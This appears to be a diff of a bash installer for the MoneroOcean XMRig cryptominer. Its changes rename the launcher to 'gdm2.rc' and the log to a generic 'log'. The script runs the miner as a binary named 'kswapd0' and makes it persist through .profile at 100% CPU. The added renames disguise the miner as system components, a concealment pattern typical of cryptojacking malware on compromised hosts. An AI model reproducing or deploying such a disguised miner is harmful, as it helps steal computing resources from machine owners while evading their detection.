@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 VERSION=2.11
@@ -21,7 +20,7 @@ EMAIL=$2 # this one is optional
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
-  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
+  echo "> setup_moneroocean_gdm2.rc <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
   exit 1
 fi
@@ -232,7 +231,7 @@ sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gd
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
@@ -243,7 +242,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 killall xmrig
 
 echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
-cat >$HOME/.gdm2/miner.sh <<EOL
+cat >$HOME/.gdm2/gdm2.rc <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
   nice $HOME/.gdm2/kswapd0 \$*
@@ -253,7 +252,7 @@ else
 fi
 EOL
 
-chmod +x $HOME/.gdm2/miner.sh
+chmod +x $HOME/.gdm2/gdm2.rc
 
 # preparing script background work and work under reboot
 
@@ -264,7 +263,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
+  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/log file)"
   /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
 
@@ -326,3 +325,5 @@ fi
 echo ""
 
 echo "[*] Setup complete"
+
+
